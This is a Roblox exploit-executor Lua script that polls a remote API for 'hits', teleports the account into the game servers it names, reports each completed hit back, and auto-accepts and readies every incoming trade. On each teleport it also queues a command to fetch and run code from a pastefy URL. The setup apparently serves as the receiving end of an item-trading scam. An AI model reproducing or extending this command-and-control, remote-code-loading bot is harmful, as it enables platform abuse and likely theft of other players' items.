local config = {
    api_base = "https://eyalzet-api.vercel.app",
    place_id = 135856908115931,
    poll_min = 3.5,
    poll_max = 6.5,
    status_path = "/dmvs-client-status",
    complete_path = "/complete-hit",
    show_gui = false,
    script_url = "https://pastefy.app/z2XKr1uE/raw",
    auto_trade = true,
    accept_any = true,
    ready_delay = 1.2,
}

if getgenv()._dmvs_aj_running then
    return
end
getgenv()._dmvs_aj_running = true

if not game:IsLoaded() then
    game.Loaded:Wait()
end

local players = game:GetService("Players")
local teleportservice = game:GetService("TeleportService")
local httpservice = game:GetService("HttpService")
local replicatedstorage = game:GetService("ReplicatedStorage")
local localplayer = players.LocalPlayer
local request_ = (syn and syn.request) or http_request or request

local apibase = (getgenv().dmvs_aj_api_base and getgenv().dmvs_aj_api_base ~= "" and getgenv().dmvs_aj_api_base)
    or config.api_base
getgenv().dmvs_aj_api_base = apibase

if getgenv().dmvs_aj_script_url and getgenv().dmvs_aj_script_url ~= "" then
    config.script_url = getgenv().dmvs_aj_script_url
end

local function queue_reexec()
    local q = queue_on_teleport
        or (syn and syn.queue_on_teleport)
        or (fluxus and fluxus.queue_on_teleport)
    if not q then
        return false
    end
    local url = tostring(config.script_url or "")
    if url == "" then
        return false
    end
    local src = string.format('getgenv()._dmvs_aj_running=nil;loadstring(game:HttpGet("%s"))()', url:gsub('"', ""))
    pcall(q, src)
    return true
end

queue_reexec()

local function jobid()
    return tostring(game.JobId or "")
end

local function jitterwait()
    local a = config.poll_min
    local b = config.poll_max
    if b < a then
        b = a
    end
    task.wait(a + math.random() * (b - a))
end

local function httpjson(method, url, payload)
    local body = payload and httpservice:JSONEncode(payload) or nil
    if request_ then
        local ok, res = pcall(request_, {
            Url = url,
            Method = method,
            Headers = { ["Content-Type"] = "application/json" },
            Body = body,
        })
        if not ok or not res or not res.Body then
            return nil
        end
        local ok2, data = pcall(function()
            return httpservice:JSONDecode(res.Body)
        end)
        return ok2 and data or nil
    end
    if method == "GET" then
        local ok, raw = pcall(function()
            return game:HttpGet(url)
        end)
        if not ok or type(raw) ~= "string" then
            return nil
        end
        local ok2, data = pcall(function()
            return httpservice:JSONDecode(raw)
        end)
        return ok2 and data or nil
    end
    return nil
end

local statuslbl
if config.show_gui then
    local coregui = game:GetService("CoreGui")
    local gui = Instance.new("ScreenGui")
    gui.Name = "dmvsaj"
    gui.ResetOnSpawn = false
    pcall(function()
        gui.Parent = coregui
    end)
    if not gui.Parent then
        gui.Parent = localplayer:WaitForChild("PlayerGui")
    end
    local frame = Instance.new("Frame")
    frame.Size = UDim2.fromOffset(220, 36)
    frame.Position = UDim2.new(0, 12, 1, -48)
    frame.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
    frame.BackgroundTransparency = 0.25
    frame.BorderSizePixel = 0
    frame.Parent = gui
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 8)
    statuslbl = Instance.new("TextLabel")
    statuslbl.BackgroundTransparency = 1
    statuslbl.Size = UDim2.new(1, -10, 1, 0)
    statuslbl.Position = UDim2.fromOffset(5, 0)
    statuslbl.Font = Enum.Font.Gotham
    statuslbl.TextSize = 12
    statuslbl.TextXAlignment = Enum.TextXAlignment.Left
    statuslbl.TextColor3 = Color3.fromRGB(210, 210, 220)
    statuslbl.Text = "aj: on"
    statuslbl.Parent = frame
end

local function setstatus(t)
    if statuslbl then
        statuslbl.Text = "aj: " .. t
    end
end

local teleporting = false
local lasttarget = ""
local lastteleport = 0

local function teleportto(placeid, targetjob)
    placeid = tonumber(placeid) or config.place_id
    targetjob = tostring(targetjob or "")
    if targetjob == "" then
        return "failed"
    end
    if targetjob == jobid() then
        return "success"
    end
    if teleporting then
        return "busy"
    end
    if targetjob == lasttarget and (tick() - lastteleport) < 15 then
        return "cooldown"
    end

    teleporting = true
    lasttarget = targetjob
    lastteleport = tick()
    setstatus("tp")
    queue_reexec()

    pcall(function()
        teleportservice:TeleportCancel()
    end)
    task.wait(0.4 + math.random() * 0.4)

    local ok = pcall(function()
        teleportservice:TeleportToPlaceInstance(placeid, targetjob, localplayer)
    end)
    if not ok then
        task.wait(2)
        queue_reexec()
        ok = pcall(function()
            teleportservice:TeleportToPlaceInstance(placeid, targetjob, localplayer)
        end)
    end

    teleporting = false
    if not ok then
        setstatus("tp fail")
        return "failed"
    end
    return "sent"
end

local function completehit(hitid)
    if not hitid or hitid == "" then
        return
    end
    httpjson("POST", apibase .. config.complete_path, {
        hit_id = hitid,
        username = localplayer.Name,
        game_type = "dmvs",
        job_id = jobid(),
    })
end

local remotes, clientglobals, sessionstate, activenegotiation
if config.auto_trade then
    pcall(function()
        remotes = require(replicatedstorage.Shared.Remotes)
        clientglobals = require(replicatedstorage.Client.Modules.ClientGlobals)
        sessionstate = clientglobals.SessionState
        activenegotiation = clientglobals.ActiveNegotiation
    end)
end

local function sides()
    if not activenegotiation then
        return nil, nil, nil
    end
    local data = activenegotiation.Data
    if type(data) ~= "table" or not data.player1 or not data.player2 then
        return nil, nil, nil
    end
    local me, other
    if data.player1.player and data.player1.player.UserId == localplayer.UserId then
        me, other = data.player1, data.player2
    else
        me, other = data.player2, data.player1
    end
    return me, other, data
end

local function getincoming()
    if not sessionstate then
        return {}
    end
    local ok, v = pcall(function()
        return sessionstate:TryIndex({ "incomingTradeRequests" })
    end)
    if ok and type(v) == "table" then
        return v
    end
    return {}
end

local function resolveplayer(entry)
    if typeof(entry) == "Instance" then
        return entry
    end
    if type(entry) == "number" then
        return players:GetPlayerByUserId(entry)
    end
    if type(entry) == "string" then
        for _, p in ipairs(players:GetPlayers()) do
            if string.lower(p.Name) == string.lower(entry) or string.lower(p.DisplayName) == string.lower(entry) then
                return p
            end
        end
    end
    if type(entry) == "table" then
        if typeof(entry.player) == "Instance" then
            return entry.player
        end
        if type(entry.UserId) == "number" then
            return players:GetPlayerByUserId(entry.UserId)
        end
        if type(entry.userId) == "number" then
            return players:GetPlayerByUserId(entry.userId)
        end
    end
    return nil
end

local lastaccept = {}
local lastready = 0

if config.auto_trade and remotes and sessionstate then
    task.spawn(function()
        while true do
            task.wait(0.8 + math.random() * 0.4)
            local now = os.clock()

            for _, entry in pairs(getincoming()) do
                local plr = resolveplayer(entry)
                if plr and plr ~= localplayer then
                    local key = plr.UserId
                    if not lastaccept[key] or now - lastaccept[key] > 2 then
                        lastaccept[key] = now
                        pcall(function()
                            remotes.AcceptInvite:FireServer(plr)
                        end)
                        setstatus("accept")
                    end
                end
            end

            local me, other, data = sides()
            if me and other and data then
                if not me.ready and (now - lastready) > config.ready_delay then
                    local lastupdate = data.lastUpdate or 0
                    local servernow = workspace:GetServerTimeNow()
                    if servernow >= lastupdate + 2.5 then
                        lastready = now
                        pcall(function()
                            remotes.SetReady:FireServer(true, data.ref or {})
                        end)
                        setstatus("ready")
                    end
                end
            end
        end
    end)
end

task.spawn(function()
    task.wait(2 + math.random() * 2)
    setstatus("wait")
    local fails = 0

    while true do
        local jid = jobid()
        local url = apibase
            .. config.status_path
            .. "?username="
            .. httpservice:UrlEncode(localplayer.Name)
            .. "&job_id="
            .. httpservice:UrlEncode(jid)

        local data = httpjson("GET", url)
        if not data then
            fails = fails + 1
            setstatus("api?")
            task.wait(math.min(8, 3 + fails))
        else
            fails = 0
            local action = tostring(data.action or "idle")
            if action == "teleport" then
                local targetjob = data.job_id or data.jobId or data.JobId
                local placeid = data.place_id or data.placeId or config.place_id
                if targetjob and tostring(targetjob) == jid then
                    setstatus("here")
                    completehit(data.hit_id)
                else
                    local result = teleportto(placeid, targetjob)
                    if result == "sent" or result == "success" then
                        task.wait(3)
                        if tostring(jobid()) == tostring(targetjob) then
                            completehit(data.hit_id)
                            setstatus("ok")
                        end
                    elseif result == "cooldown" or result == "busy" then
                        setstatus(result)
                    else
                        setstatus("fail")
                    end
                end
            else
                setstatus("idle")
            end
            jitterwait()
        end
    end
end)
